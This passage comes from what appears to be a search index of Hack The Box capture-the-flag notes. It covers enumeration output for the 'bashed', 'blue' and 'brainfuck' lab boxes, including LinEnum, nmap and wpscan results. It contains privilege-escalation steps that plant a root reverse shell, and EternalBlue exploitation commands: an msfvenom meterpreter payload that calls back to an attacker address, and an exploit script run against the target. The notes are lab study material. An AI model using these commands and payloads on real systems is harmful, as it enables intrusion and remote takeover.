drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel3.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel4.target.wants drwxr-xr-x 2 root root 4.0K Apr 12 2016 runlevel5.target.wants -rw-r--r-- 1 root root 251 Apr 5 2016 cron.service -rw-r--r-- 1 root root 290 Apr 5 2016 rsyslog.service -rw-r--r-- 1 root root 395 Jun 3 2015 resolvconf.service -rw-r--r-- 1 root root 790 Jun 1 2015 friendly-recovery.service -rw-r--r-- 1 root root 241 Mar 2 2015 ufw.service -rw-r--r-- 1 root root 250 Feb 24 2015 ureadahead-stop.service -rw-r--r-- 1 root root 242 Feb 24 2015 ureadahead-stop.timer -rw-r--r-- 1 root root 401 Feb 24 2015 ureadahead.service -rw-r--r-- 1 root root 188 Feb 24 2014 rsync.service /lib/systemd/system/apache2.service.d: total 4.0K -rw-r--r-- 1 root root 42 Apr 12 2016 apache2-systemd.conf /lib/systemd/system/halt.target.wants: total 0 lrwxrwxrwx 1 root root 24 May 10 2016 plymouth-halt.service - ../plymouth-halt.service /lib/systemd/system/initrd-switch-root.target.wants: total 0 lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-start.service - ../plymouth-start.service lrwxrwxrwx 1 root root 31 May 10 2016 plymouth-switch-root.service - ../plymouth-switch-root.service /lib/systemd/system/kexec.target.wants: total 0 lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-kexec.service - ../plymouth-kexec.service /lib/systemd/system/multi-user.target.wants: total 0 lrwxrwxrwx 1 root root 15 Dec 4 2017 getty.target - ../getty.target lrwxrwxrwx 1 root root 33 Dec 4 2017 systemd-ask-password-wall.path - ../systemd-ask-password-wall.path lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-logind.service - ../systemd-logind.service lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service - ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-user-sessions.service - ../systemd-user-sessions.service lrwxrwxrwx 1 root root 15 Jan 12 2017 dbus.service - ../dbus.service lrwxrwxrwx 1 root root 29 May 10 2016 plymouth-quit-wait.service - ../plymouth-quit-wait.service lrwxrwxrwx 1 root root 24 May 10 2016 plymouth-quit.service - ../plymouth-quit.service /lib/systemd/system/poweroff.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service - ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 28 May 10 2016 plymouth-poweroff.service - ../plymouth-poweroff.service /lib/systemd/system/reboot.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service - ../systemd-update-utmp-runlevel.service lrwxrwxrwx 1 root root 26 May 10 2016 plymouth-reboot.service - ../plymouth-reboot.service /lib/systemd/system/sysinit.target.wants: total 0 lrwxrwxrwx 1 root root 24 Dec 4 2017 systemd-udevd.service - ../systemd-udevd.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-update-utmp.service - ../systemd-update-utmp.service lrwxrwxrwx 1 root root 24 Dec 4 2017 console-setup.service - ../console-setup.service lrwxrwxrwx 1 root root 20 Dec 4 2017 cryptsetup.target - ../cryptsetup.target lrwxrwxrwx 1 root root 22 Dec 4 2017 dev-hugepages.mount - ../dev-hugepages.mount lrwxrwxrwx 1 root root 19 Dec 4 2017 dev-mqueue.mount - ../dev-mqueue.mount lrwxrwxrwx 1 root root 25 Dec 4 2017 keyboard-setup.service - ../keyboard-setup.service lrwxrwxrwx 1 root root 28 Dec 4 2017 kmod-static-nodes.service - ../kmod-static-nodes.service lrwxrwxrwx 1 root root 36 Dec 4 2017 proc-sys-fs-binfmt_misc.automount - ../proc-sys-fs-binfmt_misc.automount lrwxrwxrwx 1 root root 19 Dec 4 2017 setvtrgb.service - ../setvtrgb.service lrwxrwxrwx 1 root root 32 Dec 4 2017 sys-fs-fuse-connections.mount - ../sys-fs-fuse-connections.mount lrwxrwxrwx 1 root root 26 Dec 4 2017 sys-kernel-config.mount - ../sys-kernel-config.mount lrwxrwxrwx 1 root root 25 Dec 4 2017 sys-kernel-debug.mount - ../sys-kernel-debug.mount lrwxrwxrwx 1 root root 36 Dec 4 2017 systemd-ask-password-console.path - ../systemd-ask-password-console.path lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-binfmt.service - ../systemd-binfmt.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-hwdb-update.service - ../systemd-hwdb-update.service lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-journal-flush.service - ../systemd-journal-flush.service lrwxrwxrwx 1 root root 27 Dec 4 2017 systemd-journald.service - ../systemd-journald.service lrwxrwxrwx 1 root root 36 Dec 4 2017 systemd-machine-id-commit.service - ../systemd-machine-id-commit.service lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-modules-load.service - ../systemd-modules-load.service lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-random-seed.service - ../systemd-random-seed.service lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-sysctl.service - ../systemd-sysctl.service lrwxrwxrwx 1 root root 37 Dec 4 2017 systemd-tmpfiles-setup-dev.service - ../systemd-tmpfiles-setup-dev.service lrwxrwxrwx 1 root root 33 Dec 4 2017 systemd-tmpfiles-setup.service - ../systemd-tmpfiles-setup.service lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-udev-trigger.service - ../systemd-udev-trigger.service lrwxrwxrwx 1 root root 30 May 10 2016 plymouth-read-write.service - ../plymouth-read-write.service lrwxrwxrwx 1 root root 25 May 10 2016 plymouth-start.service - ../plymouth-start.service /lib/systemd/system/sockets.target.wants: total 0 lrwxrwxrwx 1 root root 25 Dec 4 2017 systemd-initctl.socket - ../systemd-initctl.socket lrwxrwxrwx 1 root root 32 Dec 4 2017 systemd-journald-audit.socket - ../systemd-journald-audit.socket lrwxrwxrwx 1 root root 34 Dec 4 2017 systemd-journald-dev-log.socket - ../systemd-journald-dev-log.socket lrwxrwxrwx 1 root root 26 Dec 4 2017 systemd-journald.socket - ../systemd-journald.socket lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-udevd-control.socket - ../systemd-udevd-control.socket lrwxrwxrwx 1 root root 30 Dec 4 2017 systemd-udevd-kernel.socket - ../systemd-udevd-kernel.socket lrwxrwxrwx 1 root root 14 Jan 12 2017 dbus.socket - ../dbus.socket /lib/systemd/system/timers.target.wants: total 0 lrwxrwxrwx 1 root root 31 Dec 4 2017 systemd-tmpfiles-clean.timer - ../systemd-tmpfiles-clean.timer /lib/systemd/system/systemd-timesyncd.service.d: total 4.0K -rw-r--r-- 1 root root 251 Jan 12 2017 disable-with-time-daemon.conf /lib/systemd/system/sigpwr.target.wants: total 0 lrwxrwxrwx 1 root root 36 Dec 4 2017 sigpwr-container-shutdown.service - ../sigpwr-container-shutdown.service /lib/systemd/system/rescue.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service - ../systemd-update-utmp-runlevel.service /lib/systemd/system/resolvconf.service.wants: total 0 lrwxrwxrwx 1 root root 42 Dec 4 2017 systemd-networkd-resolvconf-update.path - ../systemd-networkd-resolvconf-update.path /lib/systemd/system/rc-local.service.d: total 4.0K -rw-r--r-- 1 root root 290 Jan 12 2017 debian.conf /lib/systemd/system/graphical.target.wants: total 0 lrwxrwxrwx 1 root root 39 Dec 4 2017 systemd-update-utmp-runlevel.service - ../systemd-update-utmp-runlevel.service /lib/systemd/system/local-fs.target.wants: total 0 lrwxrwxrwx 1 root root 29 Dec 4 2017 systemd-remount-fs.service - ../systemd-remount-fs.service /lib/systemd/system/getty.target.wants: total 0 lrwxrwxrwx 1 root root 23 Dec 4 2017 getty-static.service - ../getty-static.service /lib/systemd/system/busnames.target.wants: total 0 /lib/systemd/system/runlevel1.target.wants: total 0 /lib/systemd/system/runlevel2.target.wants: total 0 /lib/systemd/system/runlevel3.target.wants: total 0 /lib/systemd/system/runlevel4.target.wants: total 0 /lib/systemd/system/runlevel5.target.wants: total 0 /lib/systemd/system-sleep: total 4.0K -rwxr-xr-x 1 root root 92 Mar 17 2016 hdparm /lib/systemd/system-preset: total 4.0K -rw-r--r-- 1 root root 869 Jan 18 2017 90-systemd.preset /lib/systemd/system-generators: total 668K -rwxr-xr-x 1 root root 59K Jan 18 2017 systemd-dbus1-generator -rwxr-xr-x 1 root root 71K Jan 18 2017 systemd-cryptsetup-generator -rwxr-xr-x 1 root root 43K Jan 18 2017 systemd-debug-generator -rwxr-xr-x 1 root root 79K Jan 18 2017 systemd-fstab-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-getty-generator -rwxr-xr-x 1 root root 119K Jan 18 2017 systemd-gpt-auto-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-hibernate-resume-generator -rwxr-xr-x 1 root root 39K Jan 18 2017 systemd-insserv-generator -rwxr-xr-x 1 root root 35K Jan 18 2017 systemd-rc-local-generator -rwxr-xr-x 1 root root 31K Jan 18 2017 systemd-system-update-generator -rwxr-xr-x 1 root root 103K Jan 18 2017 systemd-sysv-generator /lib/systemd/network: total 12K -rw-r--r-- 1 root root 404 Jan 18 2017 80-container-host0.network -rw-r--r-- 1 root root 482 Jan 18 2017 80-container-ve.network -rw-r--r-- 1 root root 80 Jan 18 2017 99-default.link /lib/systemd/system-shutdown: total 0 ### SOFTWARE ############################################# [-] Sudo version: Sudo version 1.8.16 [-] Apache version: Server version: Apache/2.4.18 (Ubuntu) Server built: 2017-09-18T15:09:02 [-] Apache user configuration: APACHE_RUN_USER=www-data APACHE_RUN_GROUP=www-data [-] Installed Apache modules: Loaded Modules: core_module (static) so_module (static) watchdog_module (static) http_module (static) log_config_module (static) logio_module (static) version_module (static) unixd_module (static) access_compat_module (shared) alias_module (shared) auth_basic_module (shared) authn_core_module (shared) authn_file_module (shared) authz_core_module (shared) authz_host_module (shared) authz_user_module (shared) autoindex_module (shared) deflate_module (shared) dir_module (shared) env_module (shared) filter_module (shared) mime_module (shared) mpm_prefork_module (shared) negotiation_module (shared) php7_module (shared) setenvif_module (shared) status_module (shared) ### INTERESTING FILES #################################### [-] Useful file locations: /bin/nc /bin/netcat /usr/bin/wget [-] Can we read/write sensitive files: -rw-r--r-- 1 root root 1482 Dec 4 2017 /etc/passwd -rw-r--r-- 1 root root 820 Dec 4 2017 /etc/group -rw-r--r-- 1 root root 575 Oct 22 2015 /etc/profile -rw-r----- 1 root shadow 933 Dec 4 2017 /etc/shadow [-] SUID files: -rwsr-xr-x 1 root root 40152 Dec 16 2016 /bin/mount -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40128 Mar 29 2016 /bin/su -rwsr-xr-x 1 root root 27608 Dec 16 2016 /bin/umount -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 40432 Mar 29 2016 /usr/bin/chsh -rwsr-xr-x 1 root root 39904 Mar 29 2016 /usr/bin/newgrp -rwsr-xr-x 1 root root 136808 Jan 20 2017 /usr/bin/sudo -rwsr-xr-x 1 root root 49584 Mar 29 2016 /usr/bin/chfn -rwsr-xr-x 1 root root 54256 Mar 29 2016 /usr/bin/passwd -rwsr-xr-x 1 root root 75304 Mar 29 2016 /usr/bin/gpasswd -rwsr-xr-x 1 root root 10624 Feb 9 2017 /usr/bin/vmware-user-suid-wrapper -rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10240 Feb 25 2014 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 428240 Aug 11 2016 /usr/lib/openssh/ssh-keysign [-] SGID files: -rwxr-sr-x 1 root shadow 35632 Mar 16 2016 /sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 35600 Mar 16 2016 /sbin/unix_chkpwd -rwxr-sr-x 1 root shadow 22768 Mar 29 2016 /usr/bin/expiry -rwxr-sr-x 1 root crontab 36080 Apr 5 2016 /usr/bin/crontab -rwxr-sr-x 1 root ssh 358624 Aug 11 2016 /usr/bin/ssh-agent -rwxr-sr-x 1 root shadow 62336 Mar 29 2016 /usr/bin/chage -rwxr-sr-x 1 root tty 27368 Dec 16 2016 /usr/bin/wall -rwxr-sr-x 1 root tty 14752 Mar 1 2016 /usr/bin/bsd-write -rwxr-sr-x 1 root mlocate 39520 Nov 17 2014 /usr/bin/mlocate [+] Files with POSIX capabilities set: /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep /usr/bin/mtr = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep [-] Can't search *.conf files as no keyword was entered [-] Can't search *.php files as no keyword was entered [-] Can't search *.log files as no keyword was entered [-] Can't search *.ini files as no keyword was entered [-] All *.conf files in /etc (recursive 1 level): -rw-r--r-- 1 root root 703 May 5 2015 /etc/logrotate.conf -rw-r--r-- 1 root root 604 Jul 2 2015 /etc/deluser.conf -rw-r--r-- 1 root root 497 May 4 2014 /etc/nsswitch.conf -rw-r--r-- 1 root root 14867 Apr 11 2016 /etc/ltrace.conf -rw-r--r-- 1 root root 7788 Dec 4 2017 /etc/ca-certificates.conf -rw-r--r-- 1 root root 552 Mar 16 2016 /etc/pam.conf -rw-r--r-- 1 root root 2084 Sep 5 2015 /etc/sysctl.conf -rw-r--r-- 1 root root 338 Nov 17 2014 /etc/updatedb.conf -rw-r--r-- 1 root root 1260 Mar 16 2016 /etc/ucf.conf -rw-r--r-- 1 root root 2584 Feb 18 2016 /etc/gai.conf -rw-r--r-- 1 root root 4781 Mar 17 2016 /etc/hdparm.conf -rw-r--r-- 1 root root 967 Oct 30 2015 /etc/mke2fs.conf -rw-r--r-- 1 root root 3028 Feb 15 2017 /etc/adduser.conf -rw-r--r-- 1 root root 771 Mar 6 2015 /etc/insserv.conf -rw-r--r-- 1 root root 2969 Nov 10 2015 /etc/debconf.conf -rw-r--r-- 1 root root 92 Oct 22 2015 /etc/host.conf -rw-r--r-- 1 root root 191 Jan 18 2016 /etc/libaudit.conf -rw-r--r-- 1 root root 144 Dec 4 2017 /etc/kernel-img.conf -rw-r--r-- 1 root root 34 Jan 27 2016 /etc/ld.so.conf -rw-r--r-- 1 root root 1371 Jan 27 2016 /etc/rsyslog.conf -rw-r--r-- 1 root root 280 Jun 19 2014 /etc/fuse.conf -rw-r--r-- 1 root root 350 Dec 4 2017 /etc/popularity-contest.conf [-] Location and contents (if accessible) of .bash_history file(s): /home/scriptmanager/.bash_history /home/arrexel/.bash_history [-] Any interesting mail in /var/mail: total 8 drwxrwsr-x 2 root mail 4096 Feb 15 2017 . drwxr-xr-x 12 root root 4096 Dec 4 2017 .. ### SCAN COMPLETE #################################### www-data@bashed:/tmp$","title":"LinEnum"},{"location":"ctf/hack-the-box/bashed[ippsec-pending]/04_PrivEscalation/PrevEsc/","text":"There is a user called scriptmanager www user can run any command as scriptmanager ( sudo -l ) Use sudo -u scriptmanager bash -i to get a shell as scriptmanager /scripts folder owned by scriptmanager has test.py that writes to a root owned file Change test.py to create a reverse shell from root account","title":"PrevEsc"},{"location":"ctf/hack-the-box/blue/01_Enumeration/Network/","text":"TCP Nmap scan report for 10.10.10.40 Host is up (0.20s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -21m25s, deviation: 34m36s, median: -1m26s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-04-23T18:40:39+01:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-04-23 13:40:38 |_ start_date: 2019-04-22 01:23:08 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 90.48 seconds (RsaCtfTool) UDP","title":"Network"},{"location":"ctf/hack-the-box/blue/01_Enumeration/Network/#tcp","text":"Nmap scan report for 10.10.10.40 Host is up (0.20s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -21m25s, deviation: 34m36s, median: -1m26s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-04-23T18:40:39+01:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-04-23 13:40:38 |_ start_date: 2019-04-22 01:23:08 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 90.48 seconds (RsaCtfTool)","title":"TCP"},{"location":"ctf/hack-the-box/blue/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/blue/02_Exploitation/EternalBlue/","text":"$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.9 lport=8888 -f exe writeup.exe https://github.com/helviojunior/MS17-010.git Use - send_and_execute.py Change - USERNAME = '\\\\' $ python send_and_execute.py 10.10.10.40 ../writeup.exe Metasploit - windows/smb/ms17_010_eternalblue","title":"EternalBlue"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/Network/","text":"TCP nmap -sV -sC -oA nmap -T4 10.10.10.17 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-23 01:47 EDT Nmap scan report for 10.10.10.17 Host is up (0.21s latency). Not shown: 995 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA) | 256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA) |_ 256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE UIDL RESP-CODES PIPELINING CAPA TOP USER 143/tcp open imap Dovecot imapd |_imap-capabilities: AUTH=PLAINA0001 listed Pre-login more ENABLE ID capabilities post-login OK SASL-IR IDLE IMAP4rev1 have LOGIN-REFERRALS LITERAL+ 443/tcp open ssl/http nginx 1.10.0 (Ubuntu) |_http-server-header: nginx/1.10.0 (Ubuntu) |_http-title: Welcome to nginx! | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Not valid before: 2017-04-13T11:19:29 |_Not valid after: 2027-04-11T11:19:29 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.03 seconds UDP","title":"Network"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/Network/#tcp","text":"nmap -sV -sC -oA nmap -T4 10.10.10.17 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-23 01:47 EDT Nmap scan report for 10.10.10.17 Host is up (0.21s latency). Not shown: 995 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA) | 256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA) |_ 256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE UIDL RESP-CODES PIPELINING CAPA TOP USER 143/tcp open imap Dovecot imapd |_imap-capabilities: AUTH=PLAINA0001 listed Pre-login more ENABLE ID capabilities post-login OK SASL-IR IDLE IMAP4rev1 have LOGIN-REFERRALS LITERAL+ 443/tcp open ssl/http nginx 1.10.0 (Ubuntu) |_http-server-header: nginx/1.10.0 (Ubuntu) |_http-title: Welcome to nginx! | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Not valid before: 2017-04-13T11:19:29 |_Not valid after: 2027-04-11T11:19:29 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.03 seconds","title":"TCP"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster WebDav CMS wpscan --url https://brainfuck.htb --disable-tls-checks _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ \u00ae \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.4.3 Sponsored by Sucuri - https://sucuri.net @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_ _______________________________________________________________ [+] URL: https://brainfuck.htb/ [+] Started: Tue Apr 23 07:32:44 2019 Interesting Finding(s): [+] https://brainfuck.htb/ | Interesting Entry: Server: nginx/1.10.0 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] https://brainfuck.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] https://brainfuck.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06). | Detected By: Rss Generator (Passive Detection) | - https://brainfuck.htb/?feed=rss2, generator https://wordpress.org/?v=4.7.3 /generator | - https://brainfuck.htb/?feed=comments-rss2, generator https://wordpress.org/?v=4.7.3 /generator | | [!] 34 vulnerabilities identified: | | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset | References: | - https://wpvulndb.com/vulnerabilities/8807 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295 | - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html | - http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html | - https://core.trac.wordpress.org/ticket/25239 | | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8815 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066 | - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8816 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381 | | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8817 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4 | | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8818 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67 | - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html | | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8819 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6 | - https://hackerone.com/reports/203515 | - https://hackerone.com/reports/203515 | | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS CSRF | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8820 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3 | | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb- prepare() potential SQL Injection | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8905 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48 | - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec | | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8906 | - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48 | - https://wpvulndb.com/vulnerabilities/8905 | | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8910 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41398 | | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8911 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41457 | | [!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer | Fixed in: 4.7.6 | References: | - 